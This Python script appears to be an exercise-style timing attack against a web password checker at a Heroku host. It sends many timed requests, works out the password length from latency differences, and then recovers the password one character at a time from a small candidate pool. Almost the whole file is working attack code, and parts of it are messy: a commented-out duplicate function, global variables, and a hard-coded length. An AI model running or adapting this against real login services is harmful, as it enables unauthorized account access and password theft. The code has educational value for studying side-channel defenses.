import time
from statistics import stdev

import requests

# from HuckIt import find_pass_len, find_tav


def timeit(url2check, repeat=1):
    tt = []
    for _ in range(repeat):
        start = time.time()
        requests.get(url2check, allow_redirects=True)
        end = time.time()
        tt.append(end - start)
    return tt


# def find_pass_len(url, MAX_LEN):
#     time_values = []
#     for num in range(1, MAX_LEN+1, 1):
#         executed_url = url + '/' + ("").ljust(num, '*')# defining the password to sent
#         time_values.append(min(timeit(executed_url, 20)))# add the time it took to the current password
#         print(f'checking length: {num} the time it took: {time_values[-1]}')
#     average = sum(time_values) / len(time_values)
#     standart_devitation = stdev(time_values)
#     for time_value in time_values:
#         if time_value - min(time_values) > standart_devitation * 1.5:
#             print(f'the length:{time_values.index(time_value)}')
#             return time_values.index(time_value)


def find_tav(temp_pass):
    POOL = 'f43adgnertm'
    time_values = []# the list of al the characters' times' values
    
    for tav in POOL:
        pass_checked = temp_pass + tav
        executed_url = url + "/" + pass_checked.ljust(pswd_len, '*')
        time_values.append(min(timeit(executed_url, 10)))
        print(f'checking password: {pass_checked} time was measured: {time_values[-1]}')
    
    # calculate the statistics for finding the correct lowest time
    average = sum(time_values) / len(time_values)
    print(f' the average is:{average}')
    standart_deviation = stdev(time_values)
    print(f'the std is : {standart_deviation}')
    
    pool_start_length = len(POOL)
    for time in time_values:
        if abs(time - average) > 0.8 * standart_deviation:
            print(f'the password {temp_pass + POOL[time_values.index(time)]} substraction from std is: {abs(time - average)}')
            POOL += POOL[time_values.index(time)]
    
    if len(POOL) > pool_start_length:
        POOL = POOL[pool_start_length:]
    
    while len(POOL) > 1:
        
        pool_start_length = len(POOL)
        for num in range(pool_start_length):
            pass_checked = temp_pass + POOL[num]
            executed_url = url + "/" + pass_checked.ljust(pswd_len, '*')
            current_time = min(timeit(executed_url, 10))
            print(f'checking password: {pass_checked} time was measured: {current_time}')
            
            if abs(current_time - average) > 0.8 * standart_deviation:
                POOL += POOL[num]
                print(f'the tav {POOL[num]} is an exception {abs(current_time-average)}')
        
        if len(POOL) > pool_start_length:
            POOL = POOL[pool_start_length:]
    
    return POOL


def find_pass_len(url, MAX_LEN):
    
    time_values = []
    possible_lens = [i for i in range(1 ,MAX_LEN + 1 , 1)]
    start_len_possible_lens = MAX_LEN
    
    for length in possible_lens:
        executed_url = url + "/" + "".ljust(length, '*')
        time_values.append(min(timeit(executed_url,10)))
        
        print(f'checking password: {length} time was measured: {time_values[-1]}')
        
        if length > 1:
            standart_deviation = stdev(time_values)# calculate the stadart deviation
            average = sum(time_values) / len(time_values)
            print(f'the average is: {average}; the standart deviation is:{standart_deviation}; the substruction frm the time to the avergae is: {time_values[-1]-average}')

            if time_values[-1] - average > standart_deviation:
                return len(time_values)-1 
    
    # in case nothing was found while the first run   
    # runs through them all with the standart deviation         
    average = sum(time_values) / len(time_values)
    print(f' the average is:{average}')
    standart_devitation = stdev(time_values)
    print(f'the std is : {standart_devitation}')

    for time in time_values:

        if time - average > standart_devitation:
            print(f'the length: {time_values.index(time) + 1} time: {time} std: {abs(time - average)}')
            return possible_lens[time_values.index(time)] - 1


if __name__ == '__main__':
    GAL_SITE = False

    if GAL_SITE:
        url = "https://agamhacks.herokuapp.com"
        # POOL_SHORT = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'

    else:
        url = "https://agamhacks.herokuapp.com"# https://passwordserver.herokuapp.com

        POOL = 'A1IHiy24U3uV'

    pswd_len = 4

    POOL  = 'A1IHiy24U3uV'# the short pool we are using
    pass_length = find_pass_len(url, 10)
    final_pass = ""
    for num in range(pass_length):
        final_pass += find_tav(final_pass)
    print(final_pass)